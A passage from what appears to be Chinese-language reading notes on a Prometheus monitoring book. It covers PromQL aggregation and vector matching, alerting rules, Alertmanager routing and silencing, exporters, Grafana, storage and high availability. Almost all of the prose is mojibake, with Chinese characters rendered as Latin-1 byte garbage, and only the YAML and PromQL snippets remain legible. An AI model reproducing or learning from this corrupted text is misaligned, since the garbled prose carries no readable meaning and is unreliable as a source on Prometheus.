å¹¶è¿”å›ï¼Œä¸ä¼šå°†ç‚¹ä¸¢å¼ƒã€‚ é›†åˆè¿ç®—PromQL æ”¯æŒç¬æ—¶å‘é‡é—´çš„é›†åˆè¿ç®—ï¼Œ and, or, unless åˆ†åˆ«å¯¹åº”äº¤é›†ã€å¹¶é›†å’Œå·®é›†ã€‚ å‘é‡åŒ¹é…æ¨¡å¼åŒ¹é…æ¨¡å¼ç”¨äºåœ¨å‘é‡è¿ç®—æ—¶ï¼Œå¯¹å·¦è¾¹çš„æŒ‡æ ‡åè¿›è¡Œæ ‡ç­¾åŒ¹é…ã€‚PromQL æœ‰ä¸¤ç§å…¸å‹çš„åŒ¹é…æ¨¡å¼ï¼šä¸€å¯¹ä¸€å’Œä¸€å¯¹å¤šä¸€å¯¹ä¸€ç”¨äºä¸¤è¾¹è¡¨è¾¾å¼çš„æ ‡ç­¾ä¸€è‡´çš„æƒ…å†µï¼›è‹¥ä¸ä¸€è‡´ï¼Œå¯ä»¥ä½¿ç”¨ on æˆ– ignoreing ç­›é€‰å‡ºä¸€äº›æ ‡ç­¾å†è¿›è¡ŒåŒ¹é…ä¸€å¯¹å¤š / å¤šå¯¹ä¸€ç”¨äºä¸¤è¾¹å‘é‡é•¿åº¦ä¸ä¸€è‡´çš„æƒ…å†µï¼šä¿®æ­£æ ‡ç­¾åï¼Œå¯èƒ½ä¸€è¾¹çš„å‘é‡ä¸­åªæœ‰ä¸€ä¸ªå€¼ï¼Œè€Œå¦ä¸€è¾¹æœ‰å¤šä¸ªï¼›æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ group_left æˆ– group_right æ¥è¿›è¡ŒåŒ¹é…ï¼Œå…¶ä¸­ group_left è¡¨ç¤ºå·¦è¾¹çš„å‘é‡åŸºæ•°æ›´å¤§ï¼Œä¹Ÿå°±æ˜¯å¤šå¯¹ä¸€ï¼›åä¹‹äº¦ç„¶ã€‚ èšåˆæ“ä½œPromQL å¯ä»¥å¯¹ç¬æ—¶å‘é‡ä¸­çš„å¤šä¸ªæŒ‡æ ‡è¿›è¡Œèšåˆï¼Œç”Ÿæˆå¦å¤–ä¸€ä¸ªç¬æ—¶å‘é‡ã€‚æ”¯æŒçš„èšåˆå‡½æ•°å¤ªå¤šï¼Œè§æ–‡æ¡£ã€‚åœ¨èšåˆæ—¶ï¼Œå¯ä»¥é€šè¿‡ by/without è¯­å¥é€‰æ‹©æ ¹æ®/ä¸æ ¹æ®é‚£äº›æ ‡ç­¾è¿›è¡Œèšåˆã€‚æœ‰ç‚¹åƒ SQL é‡Œçš„ GROUP BY.æ —å­ï¼š123456789101112131415Query: request_time_countrequest_time_count&#123;endpoint=&apos;/&apos;, instance=&apos;1&apos;&#125; 1request_time_count&#123;endpoint=&apos;/&apos;, instance=&apos;2&apos;&#125; 1request_time_count&#123;endpoint=&apos;/&apos;, instance=&apos;3&apos;&#125; 1request_time_count&#123;endpoint=&apos;/index.html&apos;, instance=&apos;1&apos;&#125; 2request_time_count&#123;endpoint=&apos;/index.html&apos;, instance=&apos;2&apos;&#125; 3request_time_count&#123;endpoint=&apos;/index.html&apos;, instance=&apos;3&apos;&#125; 4Query: sum(request_time_count)sum(request_time_count) 12Query: sum(request_time_count) by (instance)request_time_count&#123;instance=&apos;1&apos;&#125; 3request_time_count&#123;instance=&apos;2&apos;&#125; 4request_time_count&#123;instance=&apos;3&apos;&#125; 5 å†…ç½®å‡½æ•°æ›´å¤šäº†ï¼Œè§æ–‡æ¡£ã€‚rate å’Œ irate çš„åŒºåˆ«ï¼šä¸¤ä¸ªå‡½æ•°éƒ½èƒ½å¤Ÿè¡¨ç¤ºåŒºé—´å‘é‡ä¸­å„ä¸ªæ—¶é—´çš„å˜åŒ–ç‡ï¼Œä¸è¿‡ irate æ¯” rate å…·æœ‰æ›´é«˜çš„çµæ•åº¦ã€‚æ‰€ä»¥ï¼Œè§‚å¯ŸæŒ‡æ ‡æ—¶å¯ä»¥ç”¨ irateï¼Œä½†è®¾ç½®æŠ¥è­¦è§„åˆ™æ—¶åº”è¯¥ç”¨ rateï¼Œä»¥å…ä¸€äº›ç¬æ—¶å˜åŒ–äº§ç”Ÿè¯¯æŠ¥ã€‚ ç›‘æ§æŒ‡æ ‡çš„è®¾è®¡å®è·µPrometheus é¼“åŠ±å¤§å®¶è®¾è®¡å¤šå±‚æŒ‡æ ‡ï¼Œä»å¤šä¸ªç»´åº¦ç›‘æ§åˆ°æ‰€æœ‰ä¸œè¥¿ã€‚ä¹¦ä¸­åˆ—ä¸¾çš„ä¸€äº›å¸¸ç”¨çš„ç›‘æ§ç»´åº¦ã€‚çº§åˆ«ç›‘æ§ä»€ä¹ˆExporterç½‘ç»œç½‘ç»œåè®®ï¼šhttpã€dnsã€tcpã€icmpï¼›ç½‘ç»œç¡¬ä»¶ï¼šè·¯ç”±å™¨ï¼Œäº¤æ¢æœºç­‰BlockBox Exporter;SNMP Exporterä¸»æœºèµ„æºç”¨é‡node exporterå®¹å™¨èµ„æºç”¨é‡cAdvisoråº”ç”¨(åŒ…æ‹¬Library)å»¶è¿Ÿï¼Œé”™è¯¯ï¼ŒQPSï¼Œå†…éƒ¨çŠ¶æ€ç­‰ä»£ç ä¸­é›†æˆPrmometheus Clientä¸­é—´ä»¶çŠ¶æ€èµ„æºç”¨é‡ï¼Œä»¥åŠæœåŠ¡çŠ¶æ€ä»£ç ä¸­é›†æˆPrmometheus Clientç¼–æ’å·¥å…·é›†ç¾¤èµ„æºç”¨é‡ï¼Œè°ƒåº¦ç­‰Kubernetes Componentsé™¤äº†ç›‘æ§çš„ä¸åŒçº§åˆ«ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€äº›å¸¸è§çš„ç›‘æ§æ¨¡å¼ï¼Œç”¨äºä»ä¸åŒè§’åº¦æ£€æµ‹åº”ç”¨çŠ¶æ€ï¼šå››ä¸ªé»„é‡‘æŒ‡æ ‡ï¼šå»¶è¿Ÿã€é€šè®¯é‡ã€é”™è¯¯å‘ç”Ÿé€Ÿç‡ã€é¥±å’Œåº¦RED æ–¹æ³•ï¼šè¯·æ±‚é€Ÿç‡ã€è¯·æ±‚é”™è¯¯ï¼ˆæ¯ç§’å¤±è´¥çš„è¯·æ±‚æ•°ï¼‰ã€è¯·æ±‚è€—æ—¶USE æ–¹æ³•ï¼ˆç”¨äºç”„åˆ«ç³»ç»Ÿæ€§èƒ½é—®é¢˜ï¼‰ï¼šä½¿ç”¨ç‡ã€é¥±å’Œåº¦ã€é”™è¯¯è®¡æ•° ç¬¬ 3 ç« ï¼šPrometheus å‘Šè­¦å¤„ç† åŸºæœ¬æ¦‚å¿µPrometheus Server è´Ÿè´£å­˜å‚¨å‘Šè­¦è§„åˆ™å¹¶äº§ç”Ÿå‘Šè­¦ï¼Œè€Œå‘Šè­¦çš„å…·ä½“å¤„ç†æ–¹å¼ï¼ˆå¦‚å‘é‚®ä»¶é€šçŸ¥ç”¨æˆ·ï¼‰åˆ™äº¤ç”± Alertmanager æ¥åšã€‚Alertmanage ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„ç»„ä»¶ï¼Œè´Ÿè´£æ¥æ”¶å¹¶å¤„ç†æ¥è‡ª Prometheus Server(ä¹Ÿå¯ä»¥æ˜¯å…¶å®ƒçš„å®¢æˆ·ç«¯ç¨‹åº)çš„å‘Šè­¦ä¿¡æ¯ã€‚Alertmanager å¯ä»¥å¯¹è¿™äº›å‘Šè­¦ä¿¡æ¯è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œæ¯”å¦‚æ¶ˆé™¤é‡å¤çš„å‘Šè­¦ä¿¡æ¯ï¼Œå¯¹å‘Šè­¦ä¿¡æ¯è¿›è¡Œåˆ†ç»„å¹¶ä¸”è·¯ç”±åˆ°æ­£ç¡®çš„æ¥å—æ–¹ã€‚Prometheus å†…ç½®äº†å¯¹é‚®ä»¶ï¼ŒSlack ç­‰é€šçŸ¥æ–¹å¼çš„æ”¯æŒï¼ŒåŒæ—¶è¿˜æ”¯æŒä¸ Webhook çš„é€šçŸ¥é›†æˆï¼Œä»¥æ”¯æŒæ›´å¤šçš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚å¯ä»¥é€šè¿‡ Webhook ä¸é’‰é’‰æˆ–è€…ä¼ä¸šå¾®ä¿¡è¿›è¡Œé›†æˆã€‚åŒæ—¶ AlertManager è¿˜æä¾›äº†é™é»˜å’Œå‘Šè­¦æŠ‘åˆ¶æœºåˆ¶æ¥å¯¹å‘Šè­¦é€šçŸ¥è¡Œä¸ºè¿›è¡Œä¼˜åŒ–ã€‚ å‘Šè­¦è§„åˆ™å®šä¹‰åœ¨ Prometheus é…ç½®æ–‡ä»¶ä¸­é€šè¿‡ rule_files æŒ‡å®šä¸€ç»„å‘Šè­¦è§„åˆ™æ–‡ä»¶çš„è®¿é—®è·¯å¾„ã€‚è®¾ç½®è§„åˆ™åï¼ŒPrometheus ä¼šæ ¹æ® global.evaluation_interval å®šä¹‰çš„æ—¶é—´å‘¨æœŸè®¡ç®—æŠ¥è­¦è§„åˆ™ä¸­å®šä¹‰çš„ PromQL è¡¨è¾¾å¼ã€‚å¦‚æœè¡¨è¾¾å¼èƒ½å¤Ÿæ‰¾åˆ°åŒ¹é…çš„æ—¶é—´åºåˆ—ï¼Œåˆ™ä¼šå¯¹æ¯æ¡åºåˆ—äº§ç”Ÿä¸€ä¸ªå‘Šè­¦å®ä¾‹ã€‚Prometheus å‘Šè­¦é…ç½®è§„åˆ™å¦‚ä¸‹ï¼š1234567891011groups:- name: example rules: - alert: HighErrorRate expr: job:request_latency_seconds:mean5m&#123;job=\"myjob\"&#125; &gt; 0.5 for: 1m labels: severity: page annotations: summary: High request latency for &#123;&#123; $labels.job &#125;&#125;ï¼š&#123;&#123; $value &#125;&#125; description: description infoå…¶ä¸­ï¼Œannotations å®šä¹‰çš„æ ‡æ³¨éƒ¨åˆ†å†…å®¹å¯ä»¥è¿›è¡Œæ¨¡æ¿åŒ–ï¼š å¯ä»¥è®¿é—®å‘Šè­¦å®ä¾‹ä¸­æ ‡ç­¾çš„å€¼ï¼Œè€Œ å¯ä»¥è®¿é—®è¡¨è¾¾å¼ç®—å‡ºçš„æ ·æœ¬å€¼ã€‚å‡è®¾ Prom Server æ¯ 10s è®¡ç®—ä¸€æ¬¡ï¼Œåˆ™å½“ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æŠ¥è­¦å‡ºç°æ—¶ï¼ŒProm Server ä¼šäº§ç”Ÿä¸€æ¡æŠ¥è­¦ï¼Œä½†ä¼šå¤„äº PENDING çŠ¶æ€ï¼Œè€Œä¸ä¼šè§¦å‘ï¼›åœ¨ç»è¿‡ç”± for æŒ‡å®šçš„ä¸€æ®µæ—¶é—´åï¼Œå¦‚æœæŠ¥è­¦æ¡ä»¶ä¾ç„¶æ»¡è¶³ï¼Œåˆ™æŠ¥è­¦çŠ¶æ€å˜ä¸º FIRINGï¼Œè§¦å‘æŠ¥è­¦ã€‚ Alertmanager ä½¿ç”¨æ–¹æ³• éƒ¨ç½²å’Œ Prometheus Server ä¸€æ ·ï¼ŒAlertmanager ä¹Ÿæ˜¯å•æ–‡ä»¶å¯æ‰§è¡Œç¨‹åºï¼Œä¹Ÿæœ‰å®˜æ–¹æä¾›çš„ Docker é•œåƒã€‚Alertmanager çš„é…ç½®ä¸»è¦åŒ…å«ä¸¤éƒ¨åˆ†ï¼šè·¯ç”±ï¼ˆrouteï¼‰å’Œæ¥æ”¶å™¨ï¼ˆReceiverï¼‰ã€‚æ‰€æœ‰çš„å‘Šè­¦ä¿¡æ¯éƒ½ä¼šä»é…ç½®ä¸­çš„é¡¶çº§è·¯ç”±è¿›å…¥è·¯ç”±æ ‘ï¼Œæ ¹æ®è·¯ç”±è§„åˆ™å°†å‘Šè­¦ä¿¡æ¯å‘é€ç»™ç›¸åº”çš„æ¥æ”¶å™¨ã€‚é…ç½®æˆåŠŸåï¼Œåœ¨ Prom Server çš„é…ç½®ä¸­æ·»åŠ å†…å®¹ï¼Œå°† Prom Server å’Œ Alertmanager å…³è”èµ·æ¥ã€‚1234alerting: alertmanagers: - static_configs: targets: ['localhost:9093'] é…ç½®è·¯ç”±Alertmanager çš„è·¯ç”±ä¸ºæ ‘çŠ¶ç»“æ„ã€‚åœ¨åŒ¹é…è§„åˆ™æ—¶ï¼Œå¯ä»¥é€šè­¦å‘Šåç§°ï¼ˆalertnameï¼‰å’ŒæŠ¥è­¦æ ‡ç­¾ï¼ˆlabelnameï¼‰æ¥è¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…æ–¹å¼æ”¯æŒå®Œå…¨åŒ¹é…å’Œæ­£åˆ™åŒ¹é…ã€‚å¦‚æœ continue çš„å€¼ä¸º trueï¼Œåˆ™ä¼šå°†æŠ¥è­¦äº¤ç”±ä¸‹ä¸€å±‚èŠ‚ç‚¹ï¼Œå¦åˆ™å°†ä¼šç›´æ¥åœ¨å½“å‰èŠ‚ç‚¹è¿›è¡Œå¤„ç†ã€‚è·¯ç”±é…ç½®æ ¼å¼å¦‚ä¸‹ï¼š1234567891011121314151617[ receiver: &lt;string&gt; ][ continue: &lt;boolean&gt; | default = false ]match: [ &lt;labelname&gt;: &lt;labelvalue&gt;, ... ]match_re: [ &lt;labelname&gt;: &lt;regex&gt;, ... ]# åˆ†ç»„è§„åˆ™ï¼Œå¦‚æœå¤šæ¡æŠ¥è­¦çš„çš„æŸäº›æ ‡ç­¾å€¼ç›¸ç­‰ï¼Œåˆ™è¿™äº›æŠ¥è­¦å°†ä¼šè¢«å½’ä¸ºä¸€ç»„[ group_by: '[' &lt;labelname&gt;, ... ']' ][ group_wait: &lt;duration&gt; | default = 30s ][ group_interval: &lt;duration&gt; | default = 5m ][ repeat_interval: &lt;duration&gt; | default = 4h ]routes: # è·¯ç”±æ ‘çš„å­èŠ‚ç‚¹ [ - &lt;route&gt; ... ] é…ç½®æ¥æ”¶å™¨Alertmanager é»˜è®¤æ”¯æŒå¤šç§æ¥æ”¶å™¨ï¼Œå¦‚é‚®ä»¶ï¼ŒSlack ç­‰ï¼Œå…·ä½“çœ‹æ–‡æ¡£ï¼ŒåŒæ—¶ä¹Ÿæœ‰å¤šç§åŸºäº Webhook çš„ç»§æ‰¿æ–¹å¼ï¼ˆå¦‚ Telegram Bot å’Œé’‰é’‰æœºå™¨äººï¼‰ï¼Œå…·ä½“çœ‹æ–‡æ¡£ï¼Œå¦‚æœæƒ³è‡ªå·±åˆ¶ä½œ Webhook æ¥æ”¶å™¨ï¼Œåªéœ€è¦äº†è§£ Webhook æ ¼å¼å³å¯ã€‚ã€‚é…ç½®æŠ¥è­¦å…·ä½“æ¶ˆæ¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Go æ¨¡æ¿æ¥è¿›è¡Œè‡ªå®šä¹‰ã€‚ é…ç½®æŠ‘åˆ¶ / é™é»˜æœºåˆ¶æŠ‘åˆ¶æœºåˆ¶çš„ä½œç”¨ï¼šç”¨æˆ·åœ¨æ”¶åˆ°ä¸€æ¡æŠ¥è­¦é€šçŸ¥åï¼Œå¯ä»¥é€šè¿‡è§„åˆ™æ¥å±è”½æ‰åç»­çš„å…¶å®ƒæŠ¥è­¦ï¼Œä»¥å…æ”¶åˆ°è¿‡å¤šåƒåœ¾ä¿¡æ¯ï¼Œå½±å“é—®é¢˜åˆ†æã€‚æ —å­ï¼šå¦‚æœé›†ç¾¤ç‚¸äº†ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦æ”¶åˆ°â€œé›†ç¾¤çˆ†ç‚¸äº†â€çš„æŠ¥è­¦æ¶ˆæ¯å°±è¶³å¤Ÿäº†ï¼Œåé¢çš„ä¸€ä¸‡ä¸ªâ€œA æœåŠ¡ä¸å¯ç”¨â€â€œB æœåŠ¡å“åº”å»¶è¿Ÿ xxx ç§’â€çš„æŠ¥è­¦éƒ½ä¸éœ€è¦å†æŠ¥å‡ºæ¥äº†ã€‚æŠ‘åˆ¶è§„åˆ™æ˜¯é•¿æœŸè§„åˆ™ï¼Œéœ€è¦åœ¨ Alertmanager é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®ã€‚å¦‚æœåªæƒ³ä¸´æ—¶å…³æ‰æŸäº›æŠ¥è­¦ï¼Œç®¡ç†å‘˜å¯ä»¥é€šè¿‡ Alertmanager çš„ UI æ¥ä¸´æ—¶å±è”½æ»¡è¶³è§„åˆ™çš„æŠ¥è­¦é€šçŸ¥ã€‚Alertmanager çš„ UI ä¸­å¯ä»¥åˆ›å»ºé™é»˜è§„åˆ™ï¼Œç®¡ç†å‘˜å¯ä»¥é…ç½®æŠ¥è­¦åŒ¹é…è§„åˆ™ä»¥åŠé™é»˜æ—¶é—´ã€‚ æ‚é¡¹å¦‚æœæŸäº›è¯­å¥ / æŠ¥è­¦è§„åˆ™çš„è®¡ç®—æˆæœ¬å¾ˆé«˜ï¼Œé‚£ç°åœºè®¡ç®—å¯èƒ½ä¼šå¯¼è‡´ Prometheus å“åº”è¶…æ—¶ã€‚æ­¤æ—¶å¯ä»¥é€šè¿‡é…ç½® Recording Rules æ¥åœ¨åå°æå‰å¯¹ç»“æœè¿›è¡Œè¿ç®—ã€‚è¿™ä¸ªåŠŸèƒ½æœ‰ç‚¹åƒæ•°æ®åº“ç´¢å¼•â€¦ ç¬¬ 4 ç« ï¼šä½¿ç”¨ Exporter åŸºæœ¬æ¦‚å¿µå¹¿ä¹‰ä¸Šè®²ï¼Œæ‰€æœ‰å¯ä»¥å‘ Prometheus æä¾›ç›‘æ§æ ·æœ¬æ•°æ®çš„ç¨‹åºéƒ½å¯ä»¥ç§°ä½œåš Exporter. ä¸€ä¸ªè¿è¡Œ Exporter çš„å®ä¾‹ç§°ä¸ºä¸€ä¸ª Target.Prometheus ç¤¾åŒºæä¾›äº†éå¸¸ä¸°å¯Œçš„ Exporter å®ç°ï¼Œæ¶µç›–äº†ä»åŸºç¡€è®¾æ–½ï¼Œä¸­é—´ä»¶ä»¥åŠç½‘ç»œç­‰å„ä¸ªæ–¹é¢çš„ç›‘æ§åŠŸèƒ½ã€‚Exporter åº”é€šè¿‡ HTTP API ä¸º Prometheus Server æä¾›ç¬¦åˆæ ¼å¼è§„èŒƒçš„å†…å®¹ã€‚å¦‚ï¼š123456789101112131415161718# HELP HTTP Response amount# TYPE http_res_amount counterhttp_res_amount&#123;code=&quot;200&quot;&#125; 123http_res_amount&#123;code=&quot;400&quot;&#125; 12# HELP Example Histogram# TYPE example_histogram histogramexample_histogram_bucket&#123;le=&quot;0.1&quot;&#125; 1example_histogram_bucket&#123;le=&quot;+inf&quot;&#125; 2example_histogram_sum 5example_histogram_count 3# HELP Example Summary# TYPE example_sumary sumaryexample_sumary&#123;quantile=&quot;0.1&quot;&#125; 1example_sumary&#123;quantile=&quot;0.5&quot;&#125; 2example_sumary_sum 5example_sumary_count 3 Exporter ä¸¾ä¾‹ä¹¦ä¸­è¯¦ç»†æåˆ°äº†ä¸‰ä¸ª Exporterï¼Œåˆ†åˆ«æ˜¯ç›‘æ§å®¹å™¨çŠ¶æ€çš„ cAdvidorã€ç›‘æ§ MySQL è¿è¡ŒçŠ¶æ€çš„ MySQLD Exporter å’Œç›‘æ§ç½‘ç»œçŠ¶æ€çš„ Blackbox Exporter.è¿™é‡Œä¸è¯¦ç»†å±•å¼€è®²ï¼Œå¯ä»¥ç›´æ¥çœ‹æ–‡æ¡£çœ‹èŠ±çœ¼ã€‚ é›†æˆ Exporteré™¤äº†å•ç‹¬è¿è¡Œçš„ Exporter ç¨‹åºå¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åœ¨è‡ªå·±çš„åº”ç”¨ä¸­é›†æˆä¸€ä¸ª Exporter.Prometheus å®˜æ–¹å’Œç¤¾åŒºä¸ºå¤šç§è¯­è¨€æä¾›äº†é›†æˆæ”¯æŒï¼Œä½¿ç”¨è¿™äº›åº“ï¼Œåˆ™å¯ä»¥æ–¹ä¾¿åœ°åœ¨åº”ç”¨ä¸­æä¾› HTTP APIï¼Œå¹¶åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è¿›è¡ŒæŒ‡æ ‡æ”¶é›†ã€‚ ç¬¬ 5 ç« ï¼šå¯è§†åŒ–ä¸€åˆ‡Prometheus æä¾›äº†ä¸€ä¸ª Console Templateï¼Œå¯ä»¥é€šè¿‡ Go æ¨¡æ¿æ¥é…ç½®ä»»æ„æ§åˆ¶å°ç•Œé¢ã€‚ä¸è¿‡ï¼Œè¿™ç§é…ç½®æ–¹æ³•éå¸¸éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´æ¨èä½¿ç”¨ Grafana æ¥åˆ›å»ºç¾è§‚çš„ Dashboard. Grafana è®¾ç½®åŸºæœ¬æ¦‚å¿µï¼šæ•°æ®æºï¼ˆData Sourceï¼‰ä»ªè¡¨ç›˜ï¼ˆDashboardï¼‰è¡Œï¼ˆRowï¼‰é¢æ¿ï¼ˆPanelï¼‰ åˆ›å»º DashboardGrafana æ”¯æŒå¤šç§ Panelï¼Œæˆ‘å¸¸ç”¨çš„æœ‰ Singlestat å’Œ Graph.Singlestat ç”¨äºå±•ç¤ºå½“å‰çŠ¶æ€ï¼Œå¦‚ CPU ä½¿ç”¨ç‡ç­‰ï¼Œè€Œ Graph ç”¨äºå±•ç¤ºæŒ‡æ ‡éšæ—¶é—´çš„å˜åŒ–ã€‚Graph åˆ›å»ºæ—¶ï¼Œå¦‚æœè®¾ç½®çš„æŸ¥è¯¢æ¡ä»¶è¿”å›äº†å¤šä¸ªæŒ‡æ ‡ï¼Œåˆ™å¯ä»¥ç”»å‡ºå¤šä¸ªå›¾è¡¨ï¼Œè¿™ä¸€ç‚¹éå¸¸æ£’ã€‚ ç¬¬ 6 ç« ï¼šé›†ç¾¤ä¸é«˜å¯ç”¨ æ–‡ä»¶å­˜å‚¨ä½¿ç”¨æœ¬åœ°å­˜å‚¨ï¼šPrometheus å°†æ‰€æœ‰æ•°æ®æŒ‰ç…§æ—¶é—´èŒƒå›´åˆ†ç‰‡å­˜å‚¨ï¼ŒæŒ‰ç…§ä¸¤å°æ—¶ä¸ºä¸€ä¸ªæ—¶é—´çª—å£ï¼Œæ¯ä¸¤å°æ—¶çš„æ•°æ®å­˜åœ¨ä¸€ä¸ªå—ä¸­ï¼Œæ¯ä¸ªå—ä¸­åŒ…å«è¯¥æ—¶é—´çª—å£å†…çš„æ‰€æœ‰æ ·æœ¬æ•°æ®ã€å…ƒæ•°æ®æ–‡ä»¶ä»¥åŠç´¢å¼•æ–‡ä»¶ã€‚é€šè¿‡æ—¶é—´çª—å£çš„å½¢å¼ä¿å­˜æ•°æ®ï¼Œæœ‰åˆ©äº Prometheus æ ¹æ®ç‰¹å®šæ—¶é—´æ®µè¿›è¡Œæ•°æ®æŸ¥è¯¢ã€‚ä½¿ç”¨è¿œç¨‹å­˜å‚¨ï¼ˆRemote Storageï¼‰ï¼šä¸ºäº†æ»¡è¶³æŒä¹…åŒ–éœ€æ±‚ï¼ŒPrometheus å¯ä»¥ä½¿ç”¨å¤–éƒ¨å­˜å‚¨æ–¹å¼å­˜å‚¨æ ·æœ¬æ•°æ®ã€‚ä½† Prometheus æ²¡æœ‰å†…ç½®å­˜å‚¨é€‚é…å·¥å…·ï¼Œè€Œæ˜¯æä¾›ä¸¤ä¸ªæ ‡å‡†æ¥å£ï¼Œè®©ç”¨æˆ·é€šè¿‡è¿™ä¸¤ä¸ªæ¥å£å°†æ•°æ®ä¿å­˜åˆ°ä»»æ„å­˜å‚¨æœåŠ¡ä¸­ã€‚ä¸¤ä¸ªæ ‡å‡†æ¥å£ä¸º remote_read å’Œ remote_writeï¼ŒåŸºäº HTTP åè®®ï¼Œä¿¡æ¯ä¼ é€’ä¾èµ– protobuf.åŒæ—¶ï¼ŒPrometheus ç¤¾åŒºä¹Ÿæä¾›äº†éƒ¨åˆ†å¯¹äºç¬¬ä¸‰æ–¹æ•°æ®åº“çš„ Remote Storage æ”¯æŒã€‚å…·ä½“å¯è§æ–‡æ¡£ã€‚ Prometheus éƒ¨ç½²æ¶æ„åŠé«˜å¯ç”¨æ–¹æ¡ˆ æ¶æ„è”é‚¦é›†ç¾¤ï¼šå¦‚æœæ ·æœ¬æ¥è‡ªå¤šä¸ªæ•°æ®ä¸­å¿ƒï¼Œåˆ™å¯ä»¥åœ¨æ¯ä¸ªæ•°æ®ä¸­å¿ƒéƒ¨ç½²å•ç‹¬çš„ Prometheus Serverï¼Œç„¶åä½¿ç”¨ä¸€ä¸ªä¸­å¿ƒ Prom Server ä»å…¶å®ƒ Server ä¸­é€šè¿‡ /federate æ¥å£è·å–æ•°æ®ã€‚æ•°æ®æ ¼å¼ç¬¦åˆæ ‡å‡†æ ·æœ¬æ ¼å¼ï¼Œæ‰€ä»¥å¯¹äºä¸­å¿ƒ Server æ¥è¯´ï¼Œä»å…¶å®ƒ Server è·å–æ•°æ®å’Œä» Exporter è·å–æ•°æ®å®é™…ä¸Šæ²¡æœ‰ä»»ä½•å·®å¼‚ã€‚åŠŸèƒ½åˆ†åŒºï¼šå¦‚æœå•ä¸ªé›†ç¾¤ä¸­éœ€è¦é‡‡é›†çš„æ•°æ®è¿‡å¤šï¼Œå¯ä»¥åœ¨é›†ç¾¤ä¸­éƒ¨ç½²å¤šä¸ª Prom Server å®ä¾‹ï¼Œç„¶åå°†ä¸åŒçš„ç›‘æ§ä»»åŠ¡äº¤ç»™ä¸åŒ Prom Server å¤„ç†ï¼Œå†ç”±ä¸­å¿ƒ Server è¿›è¡Œèšåˆã€‚ Prometheus é«˜å¯ç”¨éƒ¨ç½²åŸºæœ¬ HAï¼šéƒ¨ç½²å¤šä¸ª Serverï¼ŒåŒæ—¶é‡‡é›†ç›¸åŒçš„ Exporter ç›®æ ‡ï¼›åŸºæœ¬ HA + è¿œç¨‹å­˜å‚¨ï¼šä½¿ç”¨è¿œç¨‹å­˜å‚¨ç¡®ä¿æ•°æ®æŒä¹…åŒ–ï¼Œè‹¥ Server å‘ç”Ÿå®•æœºï¼Œå¯ä»¥å¿«é€Ÿæ¢å¤æ•°æ®ï¼›åŸºæœ¬ HA + è¿œç¨‹å­˜å‚¨ + è”é‚¦é›†ç¾¤ï¼šæ·»åŠ è”é‚¦é›†ç¾¤ï¼Œåœ¨ä»»åŠ¡çº§åˆ«è®¾ç½®åŠŸèƒ½åˆ†åŒºï¼Œå°†ä¸åŒçš„é‡‡é›†ä»»åŠ¡åˆ’åˆ†è‡³ä¸åŒçš„ Serverï¼›é€‚åˆå¤§é‡é‡‡é›†ä»»åŠ¡ï¼Œæˆ–å¤šæ•°æ®ä¸­å¿ƒçš„åœºæ™¯ï¼›æŒ‰ç…§å®ä¾‹è¿›è¡ŒåŠŸèƒ½åˆ†åŒºï¼šé€šè¿‡ relabel è®¾ç½®å¯¹æ‰€æœ‰å®ä¾‹è¿›è¡Œ hashï¼Œå¹¶å¹³å‡åˆ†è‡³å¤šä¸ª Server è¿›è¡Œé‡‡é›†ã€‚é«˜å¯ç”¨æ–¹æ¡ˆå¥—é¤æ­é…ï¼šæœåŠ¡å¯ç”¨æ€§ï¼šä¸»å¤‡ HAæ•°æ®æŒä¹…åŒ–ï¼šè¿œç¨‹å­˜å‚¨æ°´å¹³æ‰©å±•ï¼šè”é‚¦é›†ç¾¤ Alertmanager é«˜å¯ç”¨éƒ¨ç½²åœ¨ Prometheus Server é…ç½®ä¸­ï¼Œå¯ä»¥æ·»åŠ å¤šä¸ª Alertmanager å®ä¾‹ï¼Œåœ¨æŠ¥è­¦å‘ç”Ÿæ—¶ï¼ŒServer ä¼šåŒæ—¶é€šçŸ¥å¤šä¸ª Alertmanager.è€Œ Alertmanager çš„ Gossip æœºåˆ¶å¯ä»¥ä¿è¯åŒä¸€ä¸ªæŠ¥è­¦æ¶ˆæ¯ä¸ä¼šè¢«é‡å¤å‘é€ã€‚è¿™ç§åˆ†å¸ƒå¼æ–¹æ¡ˆæ»¡è¶³äº† CAP ç†è®ºä¸­çš„ APï¼Œä½†ä¸æä¾›æ•°æ®å¼ºä¸€è‡´æ€§ä¿è¯ã€‚é€šçŸ¥æµæ°´çº¿ï¼šåˆ¤æ–­å½“å‰é€šçŸ¥æ˜¯å¦åŒ¹é…é™é»˜è§„åˆ™ï¼›æ ¹æ® Alertmanager åœ¨é›†ç¾¤ä¸­çš„é¡ºåºç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œä¸€èˆ¬ä¸º (index * 5)sï¼›åˆ¤æ–­å½“å‰æ¶ˆæ¯æ˜¯å¦è¢«å‘é€ï¼›è‹¥å·²å‘é€åˆ™ç»ˆæ­¢æµæ°´çº¿ï¼›å‘é€æ¶ˆæ¯ï¼›ä½¿ç”¨ Gossip æœºåˆ¶é€šçŸ¥é›†ç¾¤ä¸­å…¶å®ƒå®ä¾‹ã€‚ ç¬¬ 7 ç« ï¼šPrometheus æœåŠ¡å‘ç° åŸºç¡€æ¦‚å¿µPrometheus çš„æœåŠ¡å‘ç°åŸç†ï¼šé›†ç¾¤ä¸­å­˜åœ¨ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒï¼ˆå¦‚ Consul æˆ– Etcdï¼‰ä¿å­˜ç€æ‰€æœ‰å®ä¾‹ã€‚Prometheus å®šæ—¶ä»æœåŠ¡æ³¨å†Œä¸­å¿ƒä¸­è·å–æœåŠ¡åˆ—è¡¨ï¼Œç„¶åä¾æ®è¿™ä¸ªåˆ—è¡¨å»æŠ“å–æ ·æœ¬ã€‚ Prometheus çš„æœåŠ¡å‘ç°æ–¹å¼é€šè¿‡ 